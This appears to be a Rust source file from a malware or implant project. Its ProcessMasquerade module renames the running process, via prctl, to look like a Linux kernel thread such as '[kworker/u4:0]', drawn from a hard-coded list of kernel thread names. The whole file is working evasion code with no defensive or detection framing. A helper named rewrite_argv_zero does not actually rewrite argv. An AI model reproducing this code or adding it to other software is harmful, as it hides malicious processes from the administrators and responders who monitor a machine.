use anyhow::{anyhow, Result};
use libc::{prctl, PR_SET_NAME};
use std::ffi::CString;

const KERNEL_THREADS: &[&str] = &[
    "[kworker/u4:0]",
    "[kworker/u4:1]",
    "[kworker/0:1H]",
    "[kworker/0:2]",
    "[ksoftirqd/0]",
    "[migration/0]",
    "[rcu_sched]",
    "[rcu_preempt]",
    "[kthreadd]",
    "[kswapd0]",
];

pub struct ProcessMasquerade {
    target_name: String,
}

impl ProcessMasquerade {
    pub fn new(target_name: Option<String>) -> Self {
        let name = target_name.unwrap_or_else(|| {
            KERNEL_THREADS[0].to_string()
        });
        ProcessMasquerade {
            target_name: name,
        }
    }

    pub fn masquerade_current_process(&self) -> Result<()> {
        let cname = CString::new(self.target_name.as_str())
            .map_err(|e| anyhow!("Failed to create CString: {}", e))?;
        unsafe {
            if prctl(PR_SET_NAME, cname.as_ptr(), 0, 0, 0) < 0 {
                return Err(anyhow!("prctl failed: {}", std::io::Error::last_os_error()));
            }
        }
        Ok(())
    }
}

pub fn rewrite_argv_zero(new_name: &str) {
    unsafe {
        // This is a best-effort attempt and highly platform-dependent.
        // In Rust, accessing argv[0] directly to modify it isn't straightforward or safe.
        // However, prctl(PR_SET_NAME) handles the process name shown in `top` and `ps`.
        // Modifying /proc/self/cmdline requires more complex memory manipulation which is risky.
        // For now, we rely on prctl.
        let c_name = CString::new(new_name).unwrap();
        prctl(PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
    }
}
